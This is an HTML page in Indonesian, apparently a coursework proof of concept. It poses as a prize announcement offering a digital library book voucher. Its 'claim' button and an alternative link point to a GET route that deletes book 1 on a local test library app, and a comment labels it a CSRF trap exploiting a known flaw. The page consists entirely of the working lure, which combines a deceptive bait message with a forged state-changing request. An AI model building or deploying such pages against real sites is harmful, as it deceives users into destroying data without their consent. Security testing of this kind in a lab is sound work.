<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Klaim Hadiah Spesial Perpustakaan!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #f0fdf4 0%, #e0f2fe 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: #ffffff;
            border-radius: 16px;
            padding: 40px 30px;
            max-width: 480px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            border: 2px dashed #f59e0b;
        }
        h1 {
            color: #b45309;
            font-size: 24px;
            margin-bottom: 12px;
        }
        p {
            color: #4b5563;
            font-size: 15px;
            line-height: 1.6;
        }
        .btn-hadiah {
            display: inline-block;
            margin-top: 25px;
            padding: 14px 28px;
            background: #dc2626;
            color: #ffffff;
            font-size: 16px;
            font-weight: bold;
            text-decoration: none;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(220, 38, 38, 0.3);
            transition: transform 0.2s, background-color 0.2s;
        }
        .btn-hadiah:hover {
            background: #b91c1c;
            transform: scale(1.03);
        }
        .note {
            margin-top: 25px;
            font-size: 12px;
            color: #9ca3af;
        }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 48px; margin-bottom: 15px;">🎁</div>
        <h1>SELAMAT! KLAIM HADIAH ANDA</h1>
        <p>Anda terpilih memenangkan voucher buku perpustakaan digital!</p>
        <p>Klik tombol di bawah ini untuk mengambil hadiah Anda sekarang:</p>

        <!-- Tautan Jebakan CSRF (Mengeksploitasi Celah A3: route GET /buku/{buku}/hapus) -->
        <a href="http://perpustakaan_250441100112.test/buku/1/hapus" class="btn-hadiah">
            👉 KLAIM HADIAH SEKARANG 👈
        </a>

        <div class="note">
            Tautan alternatif jika menggunakan localhost:8000:
            <br>
            <a href="http://localhost:8000/buku/1/hapus" style="color:#2563eb;">http://localhost:8000/buku/1/hapus</a>
        </div>
    </div>
</body>
</html>
